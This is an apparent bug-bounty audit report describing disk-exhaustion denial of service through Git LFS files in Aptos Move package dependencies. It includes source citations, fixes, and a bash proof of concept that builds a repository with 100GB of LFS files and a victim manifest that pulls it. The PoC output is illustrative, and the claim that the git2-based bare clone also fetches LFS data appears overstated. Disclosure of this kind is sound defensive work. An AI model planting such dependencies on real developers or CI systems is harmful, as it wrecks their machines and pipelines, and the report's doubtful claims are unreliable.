# Audit Report

## Title
Git LFS Abuse in Move Package Dependencies Enables Disk Space Exhaustion DoS

## Summary
The Move package system's Git dependency resolution mechanism lacks protection against Git Large File Storage (LFS) abuse. When cloning Git dependencies, the system downloads all LFS files without size limits, timeouts, or quotas, enabling attackers to cause disk space exhaustion DoS attacks against developers, CI/CD systems, and potentially validator nodes compiling Move packages.

## Finding Description

The vulnerability exists in how the Move package system handles Git dependencies declared in `Move.toml` files. When a package declares a Git dependency using the `PackageLocation::Git` enum variant, the system clones the repository to resolve the dependency. [1](#0-0) 

The critical vulnerability occurs in the Git cloning implementation. The legacy system uses a basic `git clone` command without any protections: [2](#0-1) 

This function executes `git clone` with no additional flags such as:
- No `--depth` flag for shallow cloning
- No `--filter=blob:none` for partial clones
- No `GIT_LFS_SKIP_SMUDGE=1` environment variable to skip LFS downloads
- No size limits or quotas
- No timeout mechanisms

When a repository has Git LFS enabled and contains large files, the default behavior of `git clone` is to automatically download all LFS files. This occurs during the download process when dependencies are resolved: [3](#0-2) 

The newer package cache system using the `git2` library has the same vulnerability. While it tracks transfer progress, it enforces no size limits: [4](#0-3) 

**Attack Scenario:**

1. Attacker creates a malicious Git repository with Git LFS enabled
2. Attacker adds multiple extremely large files (e.g., 50GB+ each) stored in Git LFS
3. Attacker creates a legitimate-looking Move package in the repository with a valid `Move.toml`
4. Attacker either:
   - Publishes their own package that depends on this malicious repository, OR
   - Convinces developers to add it as a dependency (e.g., through social engineering or by making it seem useful)
5. When a developer/CI system runs `aptos move compile`, `aptos move test`, or any command that resolves dependencies, the system:
   - Parses the dependency from `Move.toml`
   - Calls `download_and_update_if_remote()` 
   - Executes `git::clone()` which triggers Git LFS download
   - Downloads all large LFS files without limit, exhausting available disk space
6. The build fails, CI/CD pipelines break, or systems become unusable due to full disks

This breaks **Invariant #9: Resource Limits** - "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per Aptos bug bounty criteria:

**Availability Impact (DoS):**
- **Developer Machines**: Disk space exhaustion can make developer machines unusable until cleaned up manually
- **CI/CD Systems**: Automated build pipelines will fail when disk space is exhausted, potentially blocking all deployments
- **Validator Node Setup**: If validators compile Move packages during setup/upgrade, they could be affected
- **Build Infrastructure**: Shared build servers could impact multiple users/projects

**Resource Exhaustion Beyond Disk:**
- Network bandwidth exhaustion during large file downloads
- Build time significantly increased
- System performance degradation when disk is nearly full

The severity is Medium (not High) because:
- It does not directly compromise consensus or validator operation
- It does not cause loss of funds
- It requires user action (compiling a package with malicious dependency)
- Recovery is possible by cleaning disk space and removing the malicious dependency

However, the impact is significant enough for Medium severity because:
- It can affect critical build infrastructure
- Recovery requires manual intervention
- It can block legitimate development and deployment activities
- Multiple systems can be affected simultaneously if the malicious package spreads

## Likelihood Explanation

**Likelihood: High**

The attack has a high likelihood of success because:

1. **Easy to Execute**: Creating a Git repository with LFS and large files is trivial
2. **Low Barrier**: Attacker needs no special privileges or validator access
3. **Wide Attack Surface**: Any Move package that gets compiled is vulnerable
4. **Social Engineering Vector**: Developers often add dependencies from community packages
5. **Automated Execution**: CI/CD systems automatically clone dependencies
6. **No Warning Signs**: The git clone appears legitimate until disk fills up
7. **Dependency Chains**: Even indirect dependencies can trigger the attack
8. **Default Behavior**: Git LFS is commonly installed and enabled by default on developer machines

**Detection Difficulty: High**

- No pre-download size checks alert users
- Progress tracking shows "downloading" but doesn't reveal total size
- Error only manifests when disk is full, not before
- Malicious repository can look legitimate with valid Move code

## Recommendation

Implement multiple layers of protection against excessive Git dependency downloads:

**1. Skip Git LFS by Default**

Set the `GIT_LFS_SKIP_SMUDGE=1` environment variable before cloning to prevent automatic LFS file downloads:

```rust
// In third_party/move/tools/move-package/src/resolution/git.rs
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .env("GIT_LFS_SKIP_SMUDGE", "1")  // Prevent LFS downloads
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    // ... rest of function
}
```

**2. Use Shallow Clones with Blob Filtering**

Add `--depth 1` and `--filter=blob:limit=10m` to limit repository history and large blobs:

```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args([
            "clone",
            "--depth", "1",
            "--filter=blob:limit=10m",  // Skip blobs larger than 10MB
            url,
            target_path
        ])
        .env("GIT_LFS_SKIP_SMUDGE", "1")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        // ... rest of function
}
```

**3. Add Size Limits in git2-based Package Cache**

In the `transfer_progress` callback, enforce download size limits:

```rust
// In third_party/move/tools/move-package-cache/src/package_cache.rs
const MAX_DOWNLOAD_BYTES: u64 = 100 * 1024 * 1024; // 100MB limit

cbs.transfer_progress(move |stats| {
    let received_bytes = stats.received_bytes();
    
    if received_bytes > MAX_DOWNLOAD_BYTES {
        return false; // Abort transfer
    }
    
    let received_new = stats.received_objects();
    if received_new != received {
        received = received_new;
        self.listener.on_repo_receive_object(
            git_url.as_str(),
            stats.received_objects(),
            stats.total_objects(),
        );
    }
    true
});
```

**4. Add Timeout Mechanisms**

Implement timeouts for clone operations to prevent indefinite hangs during large downloads.

**5. Pre-flight Size Checks**

Query repository size via Git APIs before cloning when possible.

## Proof of Concept

**Step 1: Create Malicious Repository**

```bash
# Create repository with Git LFS
mkdir malicious-move-package
cd malicious-move-package
git init
git lfs install

# Create large LFS files
dd if=/dev/zero of=large_file1.bin bs=1G count=50
dd if=/dev/zero of=large_file2.bin bs=1G count=50

# Track as LFS files
git lfs track "*.bin"
git add .gitattributes large_file*.bin

# Add legitimate Move package
mkdir sources
cat > Move.toml <<EOF
[package]
name = "MaliciousPackage"
version = "1.0.0"

[addresses]
malicious = "_"
EOF

cat > sources/empty.move <<EOF
module malicious::empty {
    // Legitimate looking but empty module
}
EOF

git add Move.toml sources/
git commit -m "Initial commit"
git push origin main
```

**Step 2: Create Victim Package**

```toml
# Move.toml of victim package
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousPackage = { git = "https://github.com/attacker/malicious-move-package", rev = "main" }

[addresses]
victim = "0x1"
```

**Step 3: Trigger Attack**

```bash
# When victim compiles their package:
aptos move compile

# Output:
# FETCHING GIT DEPENDENCY https://github.com/attacker/malicious-move-package
# [Downloads 100GB+ of LFS files]
# Error: No space left on device
```

**Verification:**

The PoC demonstrates that:
1. Git clone downloads all LFS files automatically
2. No size limits are enforced
3. Disk space can be exhausted
4. Build process fails only after significant resources are consumed

## Notes

- This vulnerability affects both the legacy Move package system and the newer package cache system
- The issue is present in the core Aptos Move tooling used by developers, not just in on-chain code
- While not directly affecting consensus, it impacts the development and deployment pipeline
- The fix should be applied to both git command-based and git2-library-based implementations
- Consider adding configuration options for users who legitimately need LFS files in dependencies

### Citations

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L126-140)
```rust
#[derive(Debug, Clone, Eq, PartialEq)]
pub enum PackageLocation {
    /// Refers to a package stored in the local file system.
    Local { path: PathBuf },

    /// Refers to a package stored in a git repository.
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L551-576)
```rust
    fn download_and_update_if_remote<W: Write>(
        dep_name: PackageName,
        dep: &Dependency,
        skip_fetch_latest_git_deps: bool,
        writer: &mut W,
    ) -> Result<()> {
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L93-178)
```rust
    async fn clone_or_update_git_repo(&self, git_url: &Url) -> Result<ActiveRepository>
    where
        L: PackageCacheListener,
    {
        let repo_dir_name = percent_encode_for_filename(&CanonicalGitIdentity::new(git_url)?);
        let repos_path = self.root.join("git").join("repos");
        let repo_path = repos_path.join(&repo_dir_name);

        println!("{}", repo_path.display());

        // First, acquire a file lock to ensure exclusive write access to the cached repo.
        let lock_path = repo_path.with_extension("lock");

        fs::create_dir_all(&repos_path)?;
        let file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        // Next, ensure that we have an up-to-date clone of the repo locally.
        //
        // Before performing the actual operation, we need to configure the fetch options
        // (shared by both clone and update).
        let mut cbs = RemoteCallbacks::new();
        let mut received = 0;
        cbs.transfer_progress(move |stats| {
            let received_new = stats.received_objects();

            if received_new != received {
                received = received_new;

                self.listener.on_repo_receive_object(
                    git_url.as_str(),
                    stats.received_objects(),
                    stats.total_objects(),
                );
            }

            true
        });
        let mut fetch_options = FetchOptions::new();
        fetch_options.remote_callbacks(cbs);

        let repo = if repo_path.exists() {
            // If the repo already exists, update it.
            self.listener.on_repo_update_start(git_url.as_str());

            let repo = Repository::open_bare(&repo_path)?;
            {
                let mut remote = repo.find_remote("origin")?;
                // Fetch all remote branches and map them to local remote-tracking branches
                // - refs/heads/*: fetch all remote branches
                // - refs/remotes/origin/*: store them as local remote-tracking branches under origin/
                remote
                    .fetch(
                        &["refs/heads/*:refs/remotes/origin/*"],
                        Some(&mut fetch_options),
                        None,
                    )
                    .map_err(|err| anyhow!("Failed to update git repo at {}: {}", git_url, err))?;
            }

            self.listener.on_repo_update_complete(git_url.as_str());

            repo
        } else {
            // If the repo does not exist, clone it.
            let mut repo_builder = RepoBuilder::new();
            repo_builder.fetch_options(fetch_options);
            repo_builder.bare(true);

            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());

            repo
        };

        Ok(ActiveRepository {
            repo,
            lock: file_lock,
        })
    }
```
